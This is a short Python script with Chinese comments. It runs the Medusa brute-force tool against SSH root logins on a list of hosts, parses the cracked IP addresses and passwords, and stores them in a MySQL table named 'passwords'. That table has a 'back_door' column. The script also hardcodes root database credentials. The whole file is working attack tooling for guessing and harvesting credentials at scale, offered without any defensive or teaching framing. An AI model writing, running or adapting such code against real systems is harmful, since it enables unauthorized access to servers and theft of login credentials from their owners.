import MySQLdb
import threading
import time
import os
import re

# 用于连接MySQL的参数
MYSQL_HOST = '192.168.10.228'
MYSQL_PORT = 3306
MYSQL_USER = 'root'
MYSQL_PASSWORD = 'mkr961...'
MYSQL_DB = 'medusa'

# 创建MySQL连接
db = MySQLdb.connect(
    host=MYSQL_HOST,
    port=MYSQL_PORT,
    user=MYSQL_USER,
    passwd=MYSQL_PASSWORD,
    db=MYSQL_DB,
    charset='utf8mb4'
)

# 获取游标
cursor = db.cursor()

# 插入数据的SQL语句
insert_sql = "INSERT INTO passwords (ip_addr, user, pass, back_door) VALUES (%s, %s, %s, %s)"

# Medusa成功破解的IP地址和密码
ip_addr = ''
password = ''

# 线程锁，用于保证数据插入时的线程安全
lock = threading.Lock()

def insert_data():
    global ip_addr
    global password

    # 获取线程锁
    lock.acquire()

    # 执行SQL语句，插入数据到MySQL
    cursor.execute(insert_sql, (ip_addr[0], 'root', password[0], 'false'))
    db.commit()

    # 释放线程锁
    lock.release()

# 监听Medusa输出，并解析IP地址和密码
def read_medusa():
    global ip_addr
    global password

    # 执行Medusa命令，将输出通过管道传递给程序
    cmd = "medusa -H Host.txt -u root -P /root/pass.txt -M ssh -t 5 -f -o output.txt -continue 2>&1 | tee output.txt"
    os.system(cmd)

    # 读取Medusa输出文件
    with open('output.txt', 'r') as f:
          for line in f:
              if '[SUCCESS]' in line:
                  ip_addr = re.findall(r"Host: (.+?) User", line)
                  password = re.findall(r'Password: (.+?) \[SUCCESS\]', line)
    # 插入数据到MySQL
    insert_data()

# 启动线程，监听Medusa输出并插入数据到MySQL
thread = threading.Thread(target=read_medusa)
thread.start()
